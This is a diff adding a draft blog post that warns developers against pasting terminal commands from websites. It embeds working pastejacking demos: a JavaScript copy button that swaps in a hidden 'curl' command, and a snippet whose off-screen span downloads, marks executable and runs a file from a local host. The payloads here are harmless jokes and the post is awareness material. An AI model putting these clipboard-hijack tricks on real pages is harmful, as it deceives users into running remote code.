@@ -1,0 +1,195 @@
+---
+layout: post
+emoji: 🗒️
+---
+
+Software engineers often tease about their non-technical friends or family getting a virus or malware because they downloaded a malice email attachment. The irony is individuals who make fun of these people participate in a dangerous activity every day that could result is something much worst ... copying and pasting.
+
+Copying and pasting code from online seem innocuous at first and it is a practice all of us practice in every day when coding or debugging. We copy from online tutorials, Stack Overflow posts, READMEs, gists, blogs, and the list goes on. Just like our non-technical friends who get desensitized to the opening email attachment coders are desensitized to how copying and pasting into our terminals could result in something much worst.
+
+#### DISCLAIMER
+This post is about not being laissez faire copying and pasting text from the internet and this content is no expectation. For each method I provide a gif example showing the issue. If you still wish to copy the code yourself I can't stop you, but you have been warned. We will explore why I wrote this disclaimer latter on.
+
+Now lets explore some examples!
+
+## Pasting Commands You Don't Understand
+
+I would hope most people, who code,  would understand this one. If you don't understand what a command is doing then don't run said command. The git gist by `frankbi` is one of my favorite examples of why you should not run copy and paste commands from websites.
+
+<div style="text-align: center;">
+    <img style="max-width: 100%;" src="/assets/images/rickrollbashcode.png">
+    <img style="max-width: 100%;" src="/assets/images/rickroll.gif"/>
+</div>
+
+While this rickroll seems harmless the arbitrary execution of code on your computer is something that should always make you nervous.
+
+## Copy Text Via Button
+
+While the pervious example is a _"no duh sherlock"_ the copy button is a bit let obvious. What is less obvious is the copy button which purpose to save you the backbreaking task of highlighting and `ctrl + c` or `right click <copy>` the text itself. The place I most often encounter the copy button is github's clone repo section.
+
+<div style="text-align: center;">
+  <img style="max-width: 65%;" src="/assets/images/githubclone.png"/>
+</div>
+
+Lets go to visit a sample blog post written by someone with nefarious intentions.
+
+<style>
+  #totallysafeandhelpful {
+    border: 1px solid;
+    padding: 10px;
+    box-shadow: 2px 4px #888888;
+    margin: auto;
+    max-width: 88%;
+
+  }
+
+  .code {
+    background: #f4f4f4;
+    border: 1px solid #ddd;
+    border-left: 5px solid #606060;
+    color: #1b1b1b;
+    page-break-inside: avoid;
+    font-family: monospace;
+    font-size: 15px;
+    line-height: 0.5;
+    max-width: 100%;
+    overflow: auto;
+    padding: 0.75em 1.8em;
+    display: block;
+    word-wrap: break-word;
+    overflow: auto;
+    margin-top: 5px
+  }
+
+  .nocopy {
+    -webkit-user-select: none;
+    -webkit-touch-callout: none;
+    -moz-user-select: none;
+    -ms-user-select: none;
+    user-select: none;
+  }
+
+  .code1 {
+    padding: 0.05em 1em;
+  }
+
+  button {
+      font-size: 18px;
+      padding: 4px;
+  }
+
+  table, th, td {
+    border-collapse: collapse;
+  }
+
+  .button:hover span {
+    display:none
+  }
+
+  .button:hover:before {
+    content:"😈";
+  }
+
+</style>
+
+
+<div id="totallysafeandhelpful">
+  <h3>Welcome to totally-safe-and-helpful.blog</h3>
+  <h5>By BadActor666</h5>
+  <p>Today we are going to give you a couple of useful docker commands. Lets jump right into it! You can copy all the commands into your terminal using the handy copy button!</p>
+  <div>Remove all images</div>
+  <table>
+    <td style="vertical-align: middle; width: 100%">
+      <div class="code nocopy">docker rmi $(docker images -a -q)</div>
+    </td>
+    <td style="vertical-align: middle;">
+      <div class="code1">
+        <button class="button" onclick="nefariousCopy()"><span>📋</span></button> 
+      </div>
+      </td>
+  </table>
+</div>
+
+<script>
+function nefariousCopy(n) {
+  var dummy = document.createElement("textarea");
+  document.body.appendChild(dummy);
+  dummy.textContent = `curl -L ${window.location.host}/assets/images/ghostbusters \n`;
+  dummy.select();
+  document.execCommand("copy");
+  document.body.removeChild(dummy);
+}
+</script>
+
+Oh `BadActor666` has the docker command I was looking for and it can easily copy & paste it into my terminal. 
+
+<div style="text-align: center;">
+    <img style="max-width: 100%;" src="/assets/images/rickroll.gif"/>
+</div>
+
+The copy button is not a pattern found on most coding websites, it is more of a novelty, but now look at something that is everywhere and everyone does.
+
+## Normal Select, Copy & Paste
+
+# https://learn.hashicorp.com/tutorials/nomad/get-started-install?in=nomad/get-started
+
+One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.  
+
+Now lets go back to Look at another post from  totally-safe-and-helpful.blog ...
+
+<div id="totallysafeandhelpful">
+
+  <h3>Welcome back to totally-safe-and-helpful.blog</h3>
+  <h5>By BadActor666</h5>
+
+  Today we are going to explore how to find the files taking up all your harddisk space using the `du` command.
+
+  <br><br>
+  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L http://127.0.0.1:4000/assets/images/sl --output sl; chmod +x sl; ./sl; clear;<br>>du -hs * </span> | sort -rh | head -5</div>
+  <br>
+</div>
+
+... seems safe enough. Looks like other code snippet from any of the following websites and blogs:
+
+* https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/selinux_users_and_administrators_guide/sect-managing_confined_services-concurrent_versioning_system-configuration_examples
+* https://brew.sh/
+* https://jvns.ca/blog/2017/03/26/bash-quirks/
+* https://serhack.me/articles/monitoring-infrastructure-grafana-influxdb-connectd/
+* https://www.cyberciti.biz/tips/how-do-i-find-out-linux-cpu-utilization.html
+* https://www.nginx.com/resources/wiki/start/topics/tutorials/install/
+
+
+You see where this is going. 
+
+<div style="text-align: center;">
+    <img style="max-width: 100%;" src="/assets/images/rickroll.gif"/>
+</div>
+
+## Worst Case Scenario
+
+### Social Engineering
+
+
+### The Attack
+```
+sudo apt install -yq curl gnupg2 ca-certificates lsb-release
+sudo apt-get -yq update
+sudo apt install -yq nginx
+sudo systemctl start nginx
+```
+
+## Why the Disclaimer
+
+This could be a blog post by itself and it might be some day, but here is the cliff notes version. Like many apps, share library, blogs this sites code is in a GitHub repo. When using someone else code or viewing a website you are trusting them to secure there code and prevent others from making changes.
+
+Do you know how strong my password is for my github? Do you know if I have MFA setup for my account? Without that info you don't know how save the contents of this site are. It is conceivable that a bad actor could gain access to my github, make a change to one of my examples, and use my this to do exactly want I am describing.
+
+yep … the internet sucks.
+
+
+## You Scared? Good! Now what?
+
+### ZSH
+
+### Tilix
+
